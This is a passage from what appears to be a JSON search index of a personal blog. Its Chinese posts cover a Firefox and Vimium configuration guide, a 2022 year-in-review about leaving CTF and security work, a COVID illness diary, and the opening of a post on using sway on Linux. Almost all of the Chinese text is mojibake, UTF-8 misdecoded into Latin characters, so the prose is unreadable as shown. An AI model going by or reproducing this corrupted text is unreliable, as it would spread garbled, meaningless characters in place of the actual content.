æˆ‘å¯¹è¿™ä¸ªæŠŠå¤§æŠŠé‡‘é’±èŠ±åœ¨æ”¿æ²»æ´»åŠ¨å’Œç»™ç®¡ç†å±‚å‘å·¥èµ„çš„ç»„ç»‡é¢‡æœ‰å¾®è¯, å¦‚æœä½ æœ‰å…´è¶£, å¯ä»¥çœ‹çœ‹ç›¸å…³çš„è°ƒæŸ¥æŠ¥å‘Š.\nåªæ˜¯ç›¸æ¯”ä¹‹ä¸‹, åˆ©ç”¨è‡ªå·±çš„å¸‚åœºå æœ‰ç‡å¼ºè¡Œæ¨Manifest v3 å’Œ Web Environment Integrity API çš„ googleå¾ˆæ˜æ˜¾å¸Œæœ›å¯¹æµè§ˆå™¨æ’ä»¶è¿›è¡Œæœ€å¤§ç¨‹åº¦çš„é™åˆ¶, å°¤å…¶æ˜¯å½±å“åˆ°ä»–ä»¬èµšé’±çš„å¹¿å‘Šæ‹¦æˆªå™¨. è¿™æ ·çš„è¡Œä¸ºå¾ˆæ˜æ˜¾ä¸äº’è”ç½‘çš„è‡ªç”±å¼€æ”¾ç²¾ç¥ç›¸äº’è¿èƒŒ, ä½†æ˜¯å¾ˆé—æ†¾, æŠ›å¼ƒchromeé€‰æ‹©å…¶ä»–chromium-basedæµè§ˆå™¨å¹¶ä¸èƒ½è§£å†³é—®é¢˜, ç”¨æˆ·ä¾æ—§å—åˆ¶äºchromiumçš„ä»£ç åº“, è€Œåè€…ä½œä¸ºè¿™äº›æµè§ˆå™¨çš„åŸºç¡€ä»£ç , åªè¦è°·æ­Œå¯¹å…¶è¿›è¡Œä¿®æ”¹, é‚£ä¹ˆå…¶ä»–æµè§ˆå™¨è¿Ÿæ—©éƒ½è¦è·Ÿè¿›. å³ä¾¿æ˜¯Firefoxä¹Ÿä½¿ç”¨äº†Manifest V3, ä½†æ˜¯ä»–ä¾æ—§ä¿ç•™äº†Manifest V2, ç®—æ˜¯ä¸€ç‚¹å°å°çš„åæŠ—å§.\n","permalink":"https://dragonbox.top/posts/tech-arm-firefox/","summary":"\u003cp\u003eä¸ç®¡ç«ç‹çš„å¸‚åœºä»½é¢å¤šä¹ˆæ‹‰èƒ¯, å¯¹äºLinux waylandç”¨æˆ·æ¥è¯´, ç›®å‰ä½“éªŒæœ€å¥½çš„æµè§ˆå™¨ä¾æ—§æ˜¯Firefox. æœ¬ç¯‡è®°å½•æˆ‘çš„FIrefoxé…ç½®, åŒ…æ‹¬æµè§ˆå™¨è®¾ç½®å’Œæ’ä»¶è®¾ç½®.\u003c/p\u003e\n\u003ch2 id=\"å¤–è§‚\"\u003eå¤–è§‚\u003c/h2\u003e\n\u003ch3 id=\"titlebar\"\u003etitlebar\u003c/h3\u003e\n\u003cp\u003eä¸ºäº†è®©æ ‡é¢˜æ ä¸­çš„å†…å®¹å¯ä»¥æ›´åŠ ç´§å‡‘, ä¸€ä¸ªå¥½åŠæ³•æ˜¯è¿›å…¥\u003ccode\u003eabout:config\u003c/code\u003e, è®¾ç½®\u003ccode\u003ebrowser.compactmode.show\u003c/code\u003eä¸ºtrue, ç„¶åè¿›å…¥custom toolbar, è®¾ç½®\u003ccode\u003eDensity\u003c/code\u003eä¸º\u003ccode\u003eCompact\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20230109231814714.png\" alt=\"image-20230109231814714\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eå¯¹äºwmç”¨æˆ·, ä¸€ä¸ªæ¨èçš„è®¾ç½®æ˜¯å‹¾é€‰ä¸Šä¸Šå›¾ä¸­çš„\u003ccode\u003eTitle Bar\u003c/code\u003eé€‰é¡¹, ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆè®¾ç½®å‘¢, å› ä¸ºè¿™æ ·å­åš, é‚£äº›æŒ‰é’®(æœ€å¤§æœ€å°åŒ–, å…³é—­çª—å£)å°±ä¼šå‡ºç°åˆ°title barä¸­, ç„¶åtitle barä¼šè¢«wmåƒæ‰, è¿™æ ·å°±å¯ä»¥ç»™ç«ç‹çš„æ ‡é¢˜æ ç•™å‡ºæ›´å¤šçš„ç©ºé—´\u003c/p\u003e\n\u003cp\u003eps: æˆ‘ç”¨çš„ä¸»é¢˜åå­—å«åštokyonight\u003c/p\u003e\n\u003ch3 id=\"firefox-ui-fix\"\u003eFirefox-UI-Fix\u003c/h3\u003e\n\u003cp\u003eä½¿ç”¨\u003ca href=\"https://github.com/black7375/Firefox-UI-Fix\"\u003eFirefox-UI-Fix\u003c/a\u003eæ¥ä¸ªæ€§åŒ–Firefoxçš„ç•Œé¢\u003c/p\u003e\n\u003ch2 id=\"addon\"\u003eAddon\u003c/h2\u003e\n\u003ch3 id=\"vimium\"\u003eVimium\u003c/h3\u003e\n\u003cp\u003eè¯¥æ’ä»¶å°†vimçš„æ“ä½œæ–¹å¼å¸¦å…¥åˆ°æµè§ˆå™¨ä¸­, èƒ½å¤Ÿè®©ç”¨æˆ·æ›´å°‘ä¾èµ–é¼ æ ‡.\u003c/p\u003e\n\u003cp\u003eé»˜è®¤æƒ…å†µä¸‹, firefoxå‡ºäºå®‰å…¨è€ƒè™‘ä¼šåœ¨ä¸€äº›é¡µé¢ä¸­ç¦ç”¨Addon, ä¸ºäº†è®©è¯¥æ’ä»¶èƒ½å¤Ÿåœ¨æ›´å¤šçš„é¡µé¢ä¸Šä½¿ç”¨, éœ€è¦åœ¨\u003ccode\u003eabout:config\u003c/code\u003eä¸­è¿›è¡Œä»¥ä¸‹è®¾ç½®\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003eextensions.webextensions.restrictedDomains\u003c/code\u003eæ¸…ç©ºæ‰\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eprivacy.resistFingerprinting.block_mozAddonManager\u003c/code\u003eè®¾ç½®ä¸ºtrue,æ¥è®©æ’ä»¶åœ¨æ‰€æœ‰é¡µé¢ä¸Šéƒ½å¯ä»¥ä½¿ç”¨\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eä»¥ä¸‹æ˜¯æˆ‘çš„Vimiumé”®ä½è®¾ç½®.\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# Insert your preferred key mappings here.\nunmapAll\nmap H previousTab\nmap J previousTab\nmap L nextTab\nmap K nextTab\nmap \u0026lt;c-j\u0026gt; scrollPageDown\nmap \u0026lt;c-k\u0026gt; scrollPageUp\nmap \u0026lt;c-o\u0026gt; goBack\nmap \u0026lt;c-i\u0026gt; goForward\nmap o Vomnibar.activateInNewTab\nmap b Vomnibar.activateBookmarksInNewTab\nmap t Vomnibar.activateTabSelection\nmap M LinkHints.activateModeToOpenInNewTab\nmap m LinkHints.activateModeToOpenInNewForegroundTab\nmap gi focusInput\nmap gg scrollToTop\nmap G scrollToBottom\nmap j scrollDown\nmap k scrollUp\nmap h scrollLeft\nmap l scrollRight\nmap x removeTab\nmap X restoreTab\nmap ? showHelp\nmap yy copyCurrentUrl\nmap p openCopiedUrlInNewTab\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eTip: å¦‚æœåœ¨æŸæ¬¡æ›´æ–°ä¹‹åå‘ç°æ’ä»¶ä¸å¯ç”¨äº†, é‚£ä¹ˆå¯ä»¥è€ƒè™‘ä¸´æ—¶åˆ‡æ¢åˆ°å¦ä¸€ä¸ªç±»ä¼¼çš„æ’ä»¶ Vimium C , æŠŠç›¸åŒçš„é”®ä½å¤åˆ¶è¿›å»å°±è¡Œå•¦.\u003c/p\u003e","title":"æ­¦è£…ç«ç‹"},{"content":" 2022å¹´æ˜¯ä¸€ä¸ªè®°å¾—è¢«çºªå¿µçš„å¹´ä»½, ä¸æ˜¯å› ä¸ºå®ƒæœ‰å¤šå¥½, è€Œæ˜¯å› ä¸ºå®ƒæœ‰å¤šç°å®\näºæˆ‘ä¸ªäººè€Œè¨€, 2022å¹´å¹¶ä¸æ˜¯ä¸€ä¸ªå¥½å¹´ä»½, æƒ³å¿…è¯»è€…ä¹Ÿæ˜¯è¿™ä¹ˆè®¤ä¸ºçš„, ä½†æ˜¯è¦è¯´å…·ä½“å“ªé‡Œä¸å¥½, å¯èƒ½åˆè¯´ä¸ä¸Šæ¥, æˆ–è€…æ˜¯é‚£äº›éœ‡åŠ¨ä¸‰è§‚çš„è®°å¿†éšç€å›½å®¶å¯¹èˆ†è®ºçš„å¼•å¯¼è€Œå˜å¾—æ¨¡ç³Š, æ¯•ç«Ÿè¿™æ˜¯æ”¿åºœæƒ¯ç”¨çš„æ‰‹æ®µ. åªæ˜¯æ€»æœ‰äººä¸ç”˜å¿ƒäºæ­¤, ä¸ç”˜å¿ƒäºé“ºå¤©ç›–åœ°çš„å¥½å¥½å¥½å’Œèµ¢èµ¢èµ¢,ä¸ç”˜å¿ƒäº1984èˆ¬çš„èˆ†è®ºæ´—è„‘,äºæ˜¯æˆ‘ä»¬èƒ½çœ‹åˆ°æ˜™èŠ±ä¸€ç°çš„ç½‘æ˜“æ–°é—»2022å¹´åº¦ç›˜ç‚¹,èƒ½åœ¨ä¸€ä¸ªä¸ªè½¬å‘çš„å¾®ä¿¡æ¶ˆæ¯ä¸­çª¥è§æ®‹å¿çš„ç°å®. è¿™æ ·çš„ä¸€å¹´æ˜¯å¯Œæœ‰æ„ä¹‰çš„, å®ƒè®©å¤ªå¤šçš„äººå˜å¾—æ¸…é†’, åªæ˜¯ç»ˆç©¶è¿˜æ˜¯æ‹…å¿ƒ, è¿™æ ·çš„æ¸…é†’åœ¨è¢«è‚†æ„ç©å¼„çš„èˆ†è®ºä¸‹è¿˜èƒ½ç•™å­˜å¤šä¹…, æ¯•ç«Ÿäººæ˜¯å¥å¿˜çš„, ä¸ªä½“å¦‚æ­¤, ç¤¾ä¼šäº¦ç„¶, è€ŒåæŠ—ä¹‹é“, åœ¨ä¹æ–‡å­—ä¸è®°å½•.\näºæ˜¯æˆ‘åšæŒè®°å½•æ—¥è®°, å¹¶ä¸”æŠŠæ¯ä¸ªæœˆçš„æ—¥è®°ä¸­æ¯”è¾ƒæœ‰ä»·å€¼çš„ç‰‡æ®µå•ç‹¬æ‘˜å½•åˆ°æ–°çš„æ–‡ä»¶ä¸­ä»¥æ–¹ä¾¿å›é¡¾, å°±è¿™æ ·ä¸€ç‚¹ä¸€æ»´è®°å½•äº†æ•´æ•´ä¸€å¹´çš„æ—¶é—´, è¿™ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡å¦‚æ­¤ç¨³å®šåœ°ä¸€ç›´ä½¿ç”¨åŒä¸€æ¬¾ç¬”è®°è½¯ä»¶. å¤šäºè¿™çœ‹ä¼¼å¾®ä¸è¶³é“çš„ä¹ æƒ¯, è®©æˆ‘èƒ½å¤Ÿåœ¨çŸ­çŸ­å‡ åˆ†é’Ÿæ—¶é—´é‡Œå›é¡¾ä»Šå¹´å€¼å¾—è®°å½•çš„å‡ ä¸ªè½¬å˜.\nå½»åº•æ”¾å¼ƒCTFå’Œç½‘ç»œå®‰å…¨ è¿™æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„å†³å®š, å› ä¸ºåœ¨ç›¸å½“é•¿çš„ä¸€æ®µæ—¶é—´é‡Œ, è‡ªå·±ç»™è‡ªå·±è´´çš„æ ‡ç­¾ä¾æ—§æ˜¯æ‰€è°“çš„é»‘å®¢, å„ç§çš„ç«èµ›å’Œå¤–å¿«ä¹Ÿç»™è‡ªå·±å¸¦æ¥äº†ä¸€ç‚¹æ”¶å…¥å’Œä¹è¶£, ç„¶è€Œåœ¨è¿™ä¸ªé¢†åŸŸå‘†å¾—è¶Šä¹…, æˆ‘è¶Šè§‰å¾—è‡ªå·±ä¸æ˜¯è¿™å—æ–™, æœŸé—´ä¹Ÿæœ‰è¿‡å‡ æ¬¡æŒ£æ‰, ç„¶è€Œç»ˆç©¶è¿˜æ˜¯æ·±å…¥ä¸ä¸‹å». è¿™æˆ–è®¸å’Œè¯¥é¢†åŸŸæ‰€å¼ºè°ƒçš„åå‘æ€ç»´æœ‰å…³, åˆæˆ–è®¸åªæ˜¯æˆ‘å•çº¯ä¸å¤ŸåŠªåŠ›, ç„¶è€Œæ—¶è‡³ä»Šæ—¥, çœ‹ç€å½“åˆä¸€åŒå­¦ä¹ çš„å°ä¼™ä¼´å¦‚ä»Šæˆä¸ºäº†ä¸šå†…çš„å¤§ç‰›, å¤ªå¤šçš„å¤±æœ›ç§¯ç´¯èµ·æ¥, è®©æˆ‘æœ€ç»ˆä¸‹å®šå†³å¿ƒç¦»å¼€, æ¯•ç«Ÿå“ªæ€•æŠ›å¼€ä¸ªäººæ„Ÿæƒ…ä¸è°ˆ, åšå£«æ¯•ä¸šä¹Ÿéœ€è¦æˆ‘æŠŠæ›´å¤šçš„æ³¨æ„åŠ›æ”¾åœ¨è®ºæ–‡ä¸Š.\nä¸å†ç›¸ä¿¡æƒå¨ åœ¨æ­¤ä¹‹å‰, æˆ‘å¯¹äºå®˜åª’å°½ç®¡ä¿æŒå¿½è§†çš„æ€åº¦, ä½†æ˜¯å¯¹äºå…¶ä¸­çš„ä¿¡æ¯çœŸå®æ€§å¹¶æ²¡æœ‰æ€€ç–‘. ä½†æ˜¯åœ¨ç»å†è¿‡2022å¹´çš„ç–«æƒ…å, åœ¨çœ‹åˆ°ç»å†äººç¥¸çš„äººæ°‘è¢«æ”¿åºœæç€è„–å­è¯´å¥½å¥½å¥½ä¹‹å, ä¸€åˆ‡çš„ä¿¡ä»»éƒ½è¢«æ¨ç¿», å¦‚ä»Šçš„è‡ªå·±åœ¨å¬åˆ°å®˜åª’å‘å¸ƒçš„æ¶ˆæ¯æ—¶, åªä¼šéº»æœ¨çš„é»˜é»˜æ‚ä½è€³æœµ.\næ”¾ä¸€æ”¾æŠ€æœ¯, å¤šå…³å¿ƒå…³å¿ƒèº«è¾¹äººå’Œèº«ä½“å¥åº· è¿‡å»çš„è‡ªå·±åœ¨é‚£äº›æ‰€è°“çš„æ–°é¢–æŠ€æœ¯ä¸ŠèŠ±è´¹äº†å¤ªå¤šå¿ƒæ€, æ²¡æœ‰ç…§é¡¾å¥½è‡ªå·±, ä¹Ÿæ²¡æœ‰å…³å¿ƒåˆ°ä»–äºº. ç„¶è€Œäººæ‰æ˜¯æœ¬, è®¡ç®—æœºä¸æ˜¯, ä¸èƒ½å› ä¸ºæŠ˜è…¾è€Œç‰ºç‰²è‡ªå·±çš„äººé™…å…³ç³», æ›´ä¸èƒ½ç‰ºç‰²è‡ªå·±çš„èº«ä½“å¥åº·.\nçœ‹æ¸…ç°å® è¿‡å»çš„æ—¶å…‰æ€»æ˜¯å¦‚æ­¤çš„ç¾å¥½, å°¤å…¶æ˜¯å’Œå½“ä¸‹çš„ç„¦è™‘å’Œè¿·èŒ«ç›¸æ¯”æ›´æ˜¯å¦‚æ­¤. è¿™ä¸¤å¹´æ‰€çœ‹åˆ°çš„äº‹ç‰©, æ‰€å¬åˆ°çš„è§é—», æ— ä¸åœ¨å‘Šè¯‰è‡ªå·±: è¿™ä¸ªä¸–ç•Œä¸€å›¢ç³Ÿ, æ™®é€šäººå¦‚æœä¸æŠŠè‡ªå·±çš„åŒæ‰‹å¼„è„å°±åªèƒ½æˆä¸ºè¢«å‰¥å‰Šçš„å¯¹è±¡; å¼€æºç¤¾åŒºçš„æŠ€æœ¯éƒ½æ˜¯åœ¨ä¸ºæƒåŠ›å’Œèµ„æœ¬æœåŠ¡; ç–«æƒ…é˜²æ§è®©å¤šåœ°æ”¿åºœæš´éœ²å‡ºå…¶ä¸‘æ¶çš„çœŸå®å˜´è„¸; ç»æµä¸‹è¡Œçš„åŒæ—¶èµ„æœ¬å®¶æ›´åŠ ä¸é¡¾æ™®é€šäººæ­»æ´»è‚†æ— å¿Œæƒ®çš„æ•›è´¢; æˆ¿åœ°äº§å¸‚åœºè§æ¡ä¸‹å¼€å‘å•†å’Œæ™®é€šæ¶ˆè´¹è€…çš„ä¼—ç”Ÿç›¸, å°±è¿ç ”ç©¶ç”Ÿçš„å¯¼å¸ˆæ‹›å­¦ç”Ÿä¹Ÿä¸æ˜¯ä¸ºäº†ä¼ é“æˆä¸šè€Œæ˜¯ä¸ºäº†æ‹‰äººå¹²æ´», åˆ©ç›Šäº¤æ¢. æˆ‘å˜å¾—è¶Šæ¥è¶Šéº»æœ¨, åŸæ¥æ‰€è°“æˆé•¿, å°±æ˜¯ç”Ÿæ´»ä¸­é‚£äº›çº¯ç²¹çš„ä¸œè¥¿ä¸€ä¸ªä¸€ä¸ªç ¸ç¢, åªç•™ä¸‹ä¸€åœ°é¸¡æ¯›çš„è¿‡ç¨‹å•Š.\nä½†æ˜¯,ç»å†è¿™äº›ä¹‹å, æ‰ä¼šæ›´åŠ æ·±åˆ»æ„è¯†åˆ°è¿‡å»çš„ç¾å¥½æ—¶å…‰æ­£æ˜¯åœ¨è¿™äº›ä¸–ä¿—ä¼—ç”Ÿçš„æ”¯æ’‘ä¸‹æ‰€è¥é€ å‡ºçš„ä¸ºå¹´è½»äººçš„å‡è±¡, çœŸæ­£çš„ä¸–ç•Œ, æœ¬å°±å¦‚æ­¤. é™¤äº†æ‹”å‰‘, åˆ«æ— é€‰æ‹©.\nå¸Œæœ›2023å¹´, è‡ªå·±å¯ä»¥å˜å¾—æ›´å¥½.\n","permalink":"https://dragonbox.top/posts/gossip-2022-summary/","summary":"\u003cblockquote\u003e\n\u003cp\u003e2022å¹´æ˜¯ä¸€ä¸ªè®°å¾—è¢«çºªå¿µçš„å¹´ä»½, ä¸æ˜¯å› ä¸ºå®ƒæœ‰å¤šå¥½, è€Œæ˜¯å› ä¸ºå®ƒæœ‰å¤šç°å®\u003c/p\u003e\n\u003c/blockquote\u003e","title":"2022å¹´åº¦æ€»ç»“"},{"content":" ç”Ÿå‘½æœ¬å°±å¦‚æ­¤è„†å¼±\n12.16 å®¿èˆæ¥¼é‡Œçš„äººå¾ˆå¤šå·²ç»é˜³äº†, æ–œå¯¹é—¨çš„å®¿èˆä¹Ÿé˜³äº†. å­¦æ ¡èµ¶äººä¸”æœºç¥¨ä»·æ ¼ä½,äºæ˜¯é€‰åœ¨äº†16å·å‡ºå‘.\n16å·å½“å¤©æ¥åˆ°æœºåœºçš„æ—¶å€™å®Œå…¨æ²¡æœ‰æ£€æŸ¥å¥åº·å®çš„æ­¥éª¤, ç”šè‡³æ²¡æœ‰é‡ä½“æ¸©çš„æ­¥éª¤, ä¸€ç¬é—´çš„æ„Ÿè§‰æ˜¯å¾ˆä¸ä¹ æƒ¯, ç„¶åå°±æ˜¯è§‰å¾—å±é™©. ä½†æ˜¯æ—©é¤ä¸èƒ½ä¸åƒ, äºæ˜¯åœ¨ç™»æœºå£åƒäº†kfc, è¿™æ˜¯å¯èƒ½æ„ŸæŸ“çš„ç¬¬ä¸€ä¸ªç‚¹.\nåé£æœº, ä¸‹é£æœº, ä¸Šå¤§å·´, ç„¶ååˆ°è½¦ç«™. è¿™æœŸé—´èƒ½è¢«æ„ŸæŸ“çš„ç‚¹å¤ªå¤šäº†, äººå£èšé›†å¤ªå¯†é›†äº†.\nå›åˆ°å®¶å, å‡Œæ™¨ä¸€ç‚¹ä¸åˆ°æ„Ÿè§‰èº«ä½“ç€å‡‰,å–‰å’™éšéšæœ‰ç‚¹ä¸èˆ’æœ.\n12.17 å–‰å’™å‘ç‚,æ²¡é‡ä½“æ¸©,ä»å­˜æœ‰ä¾¥å¹¸å¿ƒç†.\n12.18 å–‰å’™å‘ç‚+å¤´æ™•,ä½“æ¸©æ­£å¸¸,å®¶é‡Œäººå› æ­¤è§‰å¾—åªæ˜¯æ„Ÿå†’,æˆ‘è¯´å¯èƒ½æ˜¯æ–°å† ,ä½†æ˜¯ä½ ä»¬è‚¯å®šé˜²ä¸ä½äº†.\n12.19 å–‰å’™å‘ç‚åŠ é‡ä¸ºåˆ€ç‰‡å—“, å¤´ä¸æ™•äº†,ä½“æ¸©æ­£å¸¸.\n12.20 åˆ€ç‰‡å—“,èƒŒéƒ¨è‚Œè‚‰æœ‰äº›é…¸ç—›æ— åŠ›,å¼€å§‹å’³å—½é¼»å¡æµé¼»æ¶•.ä½“æ¸©æ­£å¸¸.\npddä¸Šçš„è¯éƒ½è¦ä¸‹ä¸ªæœˆæ‰èƒ½é€å‡ºæ¥, å®¶é‡Œçš„è¯ä¹Ÿå¾ˆæœ‰é™.\næ™šä¸Šå¦ˆå¦ˆå‘çƒ§äº†, ç”¨æŠ—åŸè¯•çº¸ä¸€æµ‹å¾ˆå¿«å°±å‡ºæ¥äº†ä¸¤é“æ , ä¼°è®¡æ˜¯è¢«æˆ‘ä¼ æŸ“çš„, æˆ‘åæ‚”è¿™ä¸ªæ—¶å€™å›æ¥, å“ªæ€•å‡ºå»æ—…æ¸¸ä¸€åœˆå…»å‡ºæŠ—ä½“å†å›æ¥ä¹Ÿå¥½.\n12.21 ç»§ç»­åˆ€ç‰‡å—“å­ï¼Œæµé¼»æ¶•å’³å—½é¼»å¡ï¼Œè‚Œè‚‰ä¸ç–¼äº†ï¼Œä½“æ¸©æ­£å¸¸ã€‚è€å¦ˆçƒ§é€€äº†ï¼Œä½†æ˜¯æœ‰äº›å¤´æ™•\n12.22 å—“å­å·®ä¸å¤šå¥½äº†ï¼Œæµé¼»æ¶•é¼»å¡ï¼Œä¸å’³å—½äº†ã€‚è€çˆ¸å¼€å§‹å‡ºç°ç—‡çŠ¶ï¼Œå…¨èº«è‚Œè‚‰ç–¼ç—›ï¼Œä½†æ˜¯æ²¡æœ‰å‘çƒ§ã€‚\n12.23 ç—‡çŠ¶åŸºæœ¬æ¶ˆå¤±. å®¶é‡Œäººç—‡çŠ¶éƒ½æœ‰æ˜æ˜¾å¥½è½¬\n12.24 å®Œå…¨å¥½è½¬, å‰å‰ååç»å†äº†å…«å¤©.\n","permalink":"https://dragonbox.top/posts/gossip-yang-diary-md/","summary":"\u003cblockquote\u003e\n\u003cp\u003eç”Ÿå‘½æœ¬å°±å¦‚æ­¤è„†å¼±\u003c/p\u003e\n\u003c/blockquote\u003e","title":"å°é˜³äººæ—¥è®°"},{"content":"ä¸çŸ¥ä¸è§‰ä½¿ç”¨swayå·²ç»æ•´æ•´ä¸€å¹´äº†ï¼Œäºæ˜¯æ¥è°ˆä¸€è°ˆè‡ªå·±è¿™ä¸€å¹´çš„ä½¿ç”¨æ„Ÿå—ï¼Œé¡ºä¾¿å›é¡¾äº†ä¸€ä¸‹è¿‡å»ã€‚\nèµ·å›  2019å¹´ï¼Œåœ¨ä¸€æ¬¡ç¼–ç¨‹ä½œä¸šçš„æ—¶å€™ï¼ŒåŒä¸“ä¸šçš„å¦ä¸€ä¸ªè€å“¥å‘æˆ‘å±•ç¤ºäº†vimçš„ä»£ç hè¡¥å…¨ï¼Œæˆ‘ç«‹åˆ»è¢«è¿™ç§ç®€é™‹ä½†æ˜¯æ‰©å±•æ€§æå¼ºçš„ä»£ç ç¼–è¾‘å™¨å¸å¼•äº†ï¼Œäºæ˜¯å½“æ—¶è¿˜æ˜¯ä¸ªåˆšè½¬å…¥è®¡ç®—æœºä¸“ä¸šçš„å°ç™½å°±å¼€å§‹å“¼å“§å“¼å“§åœ°å­¦ä¹ vimçš„é…ç½®å’Œæ’ä»¶çš„å®‰è£…ã€‚å½“ç„¶ï¼Œè¿™äº›éƒ½å‘ç”Ÿåœ¨æˆ‘çš„Kali Linuxè™šæ‹Ÿæœºä¸­ã€‚\né‚£ä¸ªæ—¶å€™æˆ‘æ­£æ¥è§¦CTFï¼Œå¾ˆå¤šæ—¶å€™éƒ½è¦å¼€ç€è™šæ‹Ÿæœºï¼Œäºæ˜¯æœ‰ä¸€å¤©åŠ¨èµ·äº†æŠŠç”µè„‘ç³»ç»Ÿç›´æ¥è£…æˆlinuxçš„æƒ³æ³•ã€‚å› ä¸ºè‡ªå·±çš„ç¬¬ä¸€å°ç¬”è®°æœ¬æ˜¯æš—å¤œç²¾çµ2ï¼Œæ¸¸æˆæœ¬è£…Linuxï¼Œç¬¬ä¸€ä¸ªè¦è€ƒè™‘çš„å°±æ˜¯å…¼å®¹æ€§å’Œç¨³å®šæ€§ï¼Œåœ¨æƒè¡¡å„ä¸ªå‘è¡Œç‰ˆçš„ä¼˜åŠ¿å’Œæµè¡Œç¨‹åº¦åï¼Œæˆ‘é€‰æ‹©äº†ubuntu18.04ã€‚ç¬”è®°æœ¬é‡è£…å®Œæ¯•åé™¤äº†é£æ‰‡è½¬ä¸ªä¸åœç«Ÿç„¶ä¸€åˆ‡è¿è¡Œæ­£å¸¸ï¼Œè¿™è®©æˆ‘å®åœ¨æœ‰äº›æƒŠå–œï¼Œè€Œé£æ‰‡é—®é¢˜æ˜¯è‹±ä¼Ÿè¾¾ç‹¬æ˜¾å¯¼è‡´çš„ï¼Œåœ¨ubuntuä¸Šï¼Œåªéœ€è¦ä¸€æ¡sudo ubuntu-drivers autoinstallå°±å®Œç¾è§£å†³äº†ã€‚å½“æ—¶çš„è‡ªå·±å¾ˆå¼€å¿ƒï¼Œä»¿ä½›æ‰“å¼€äº†ä¸€é“æ–°ä¸–ç•Œçš„å¤§é—¨ã€‚\nåæ¥ï¼Œæˆ‘å»å‰æ—å‚åŠ äº†ç¬¬ä¸€æ¬¡çº¿ä¸‹èµ›ï¼Œubuntuæ²¡æœ‰æ‰é“¾å­ï¼Œå¸®æˆ‘æ‹¿äº†ä¸€ä¸ªä¸€è¡€ï¼Œæˆ‘å¾ˆæ»¡æ„ã€‚ç›´åˆ°ä¸€æ¬¡ä¸Šè¯¾ï¼Œæ‰‹è´±æ‰§è¡Œäº†apt upgradeï¼Œå‡çº§å®Œç”µè„‘ç«Ÿç„¶æ— æ³•å¼€æœºäº†ï¼Œä¸€æ•´ä¸ªæ— è¯­ï¼Œè€Œå½“æ—¶ä¸´è¿‘æœŸæœ«ï¼Œæˆ‘å·²ç»æ²¡æœ‰æ—¶é—´å†å»æŠ˜è…¾ç³»ç»Ÿäº†ï¼Œäºæ˜¯ç´§æ€¥å®‰è£…äº†windowsåº”ä»˜æœŸæœ«å¤ä¹ ï¼Œé¡ºä¾¿ä¸‹å•äº†ä¸€å°å¯¹Linuxæ›´åŠ å‹å¥½çš„ç¬”è®°æœ¬Thinkpad T480ã€‚\næœŸæœ«è€ƒè¯•ç»“æŸåï¼Œæˆ‘å¬è¯´äº†Arch Linux çš„å¤§åï¼Œä½†æ˜¯å‡ºäºç•éš¾æƒ…ç»ªï¼Œæˆ‘é€‰æ‹©å°†ubuntu18.04å®‰è£…åœ¨æˆ‘çš„thinkpad t480ä¸Šï¼Œç„¶åå»å‚åŠ xmançš„å¤ä»¤è¥ã€‚åœ¨å¤ä»¤è¥æœŸé—´ï¼Œæˆ‘çš„ç”µè„‘åœ¨è¿æ¥wifiä¸€æ®µæ—¶é—´åå°±å†ä¹Ÿè¿æ¥ä¸ä¸Šäº†ï¼Œç¬¬ä¸€æ¬¡æˆ‘é€‰æ‹©äº†é‡è£…ï¼Œä½†æ˜¯ç¬¬äºŒæ¬¡è¿˜æ˜¯åŒæ ·çš„é—®é¢˜ï¼Œæˆ‘åªå¥½ç»æœ›åœ°å›åˆ°windows10ï¼Œäº‹ååˆ†æçš„æ—¶å€™ï¼Œæˆ‘è§‰å¾—åº”è¯¥æ˜¯é©±åŠ¨çš„é—®é¢˜ï¼Œthinkpad t480æ˜¯2018å¹´ä¸‹åŠå¹´å‘å¸ƒçš„ï¼Œubuntu18.04çš„é©±åŠ¨å¯èƒ½ç¡®å®æ²¡è¦†ç›–åˆ°å®ƒçš„ç½‘å¡ã€‚\nä¹‹åçš„å¥½å‡ ä¸ªæœˆé‡Œï¼Œæˆ‘éƒ½ä¹–ä¹–ç”¨ç€windows10å’ŒWSL2ï¼Œå®ä¹ çš„æ—¶å€™å…¨ç¨‹åœ¨è™šæ‹Ÿæœºé‡Œé¢å†™ä»£ç ã€‚ç­‰åˆ°å®ä¹ ç»“æŸã€ä¿ç ”ä¹Ÿç»“æŸçš„æ—¶å€™ï¼Œæˆ‘åˆå¼€å§‹äº†æ–°ä¸€è½®çš„æŠ˜è…¾ã€‚\n2020å¹´ä¸‹åŠå¹´ï¼Œæˆ‘å°†è‡ªå·±çš„ä¸»åŠ›ç”µè„‘å…¨é¢è¿ç§»åˆ°äº†Manjaro Linuxä¸‹ï¼Œé‚£ä¸ªæ—¶å€™qv2rayè¿˜å¾ˆæ´»è·ƒï¼Œæˆ‘çš„ç§‘å­¦ä¸Šç½‘ä¹Ÿå¾ˆä¾èµ–å®ƒï¼Œä½†æ˜¯æœ‰å¥½å‡ æ¬¡åœ¨æ›´æ–°çš„æ—¶å€™å‘ç”Ÿäº†Manjaroç‰¹æœ‰çš„é—®é¢˜ï¼šè½¯ä»¶çš„ç‰ˆæœ¬æ›´æ–°ä¸Šæ¥äº†ï¼Œä½†æ˜¯è½¯ä»¶çš„ä¾èµ–æ²¡æœ‰æ›´æ–°ä¸Šæ¥ï¼Œè¿™ç§é—®é¢˜ä¹Ÿå½±å“äº†triliumç­‰è½¯ä»¶ï¼Œè™½ç„¶ä¸èƒ½æ€ªmanjaroï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æ„¤è€Œè½¬å‘äº†Arch Linuxï¼Œä¸€ç›´åˆ°ä»Šå¤©æˆ‘ä¹Ÿè¿˜åœ¨ç”¨ã€‚\nè½¬åˆ°Arch 